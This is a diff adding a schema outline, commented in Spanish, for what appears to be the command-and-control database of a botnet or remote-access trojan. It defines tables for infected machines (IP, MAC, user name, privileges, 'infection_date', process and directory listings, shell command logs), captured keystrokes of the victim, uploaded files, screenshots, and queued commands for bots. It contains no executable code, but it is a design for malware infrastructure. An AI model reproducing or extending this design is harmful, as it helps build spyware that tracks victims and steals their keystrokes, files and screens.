@@ -1,0 +1,49 @@
+
+
+bots:
+	LONGINT	id
+	char(33)	botid 		// hash con cpuid + hdd serial number
+	char(16)	ip		// ip externa
+	char(2)		country		// pais
+	char(16)	local_ip	
+	char(19)	network 	// direccion interna
+	int		privileges	// privilegios 0 = normal, 1 = admin, 2 = system
+	char(128)	user_name	
+	char(128)	cpu_name	
+	char(256)	domain		// dominio win32
+	char(18)	mac_address	// MAC
+	char(2048)	cpu_info	// arquitectura, velocidad, nucleos, ram, espacio disco
+	date		infection_date	// fecha infeccion
+	date		last_date
+	bool		file_uploading	// subiendo archivo (activado si ya se esta subiendo un archivo).
+	bool		screenshot_on	// define que se va a la captura de pantalla
+	char(65535)	list_process	// lista de procesos		   (respuesta bot)
+	MEDIUMTEXT	list_directory	// lista de archivos y directorios (respuesta bot)
+	char(4000)	update_url	// url de actualizacion 
+	MEIDUMTEXT	shell_log	// log respuesta commandos shell	
+
+keylogger:
+	LONGINT	id
+	char(33)	botid		//identificador bot
+	LONGTEXT	written		//escrito por el infectado
+	char(33)	token		//token establecido
+
+
+file:
+	LONGINT	id
+	char(33)	botid		//identificador bot
+	char(128)	file_name	//nombre archivo
+	char(33)	token		//token establecido
+
+
+screenshot:
+	LONGINT id
+	char(33)	botid		//identificador bot
+	char(33)	token		//token establecido
+
+
+task:
+	char(33)	botid		//identificador bot
+	char(2048)	command		//comando
+
+
